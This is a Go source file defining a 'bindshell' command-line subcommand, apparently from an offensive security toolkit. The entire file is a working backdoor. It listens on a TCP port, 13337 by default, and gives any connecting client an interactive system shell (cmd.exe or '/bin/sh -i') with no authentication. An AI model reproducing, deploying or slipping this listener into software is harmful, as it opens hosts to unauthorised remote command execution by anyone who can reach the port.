package cmd

import (
	"fmt"
	"io"
	"net"
	"os/exec"
	"runtime"

	"github.com/spf13/cobra"
)

var rsPort string

var rsCmd = &cobra.Command{
	Use:   "bindshell",
	Short: "Bind shell to remote to connect",
	Long: `This server listens for command over the internet and executes it
	in local shell`,
	Run: func(cmd *cobra.Command, args []string) {
		fmt.Println("Starting the listener for bind shell on port ", rsPort)

		listener, err := net.Listen("tcp", ":"+rsPort)
		if err != nil {
			fmt.Println("Unable to run the listener: ", err)
			return
		}
		fmt.Println("Listening on: ", rsPort)
		defer listener.Close()
		for {
			conn, err := listener.Accept()
			if err != nil {
				fmt.Println("Unable to take requests: ", err)
				return
			}
			go handle(conn)

		}
	},
}

func handle(conn net.Conn) {
	defer conn.Close()
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command(`C:\\Windows\\System32\\cmd.exe`)
	} else {
		cmd = exec.Command("/bin/sh", "-i")
	}
	// create a pipe for directing the stdin and stdout over the conn
	// so that we don't need to flush the stdout to the conn
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go func() {
		if _, err := io.Copy(conn, rp); err != nil {
			fmt.Println("Error in copying the stdout: ", err)
		}
	}()
	if err := cmd.Run(); err != nil {
		fmt.Println("Error in executing the command: ", err)
		return
	}
	return
}
func init() {
	rootCmd.AddCommand(rsCmd)
	rsCmd.Flags().StringVar(&rsPort, "port", "13337", `
	The port on which this bind shell listen for commands
	`)
}
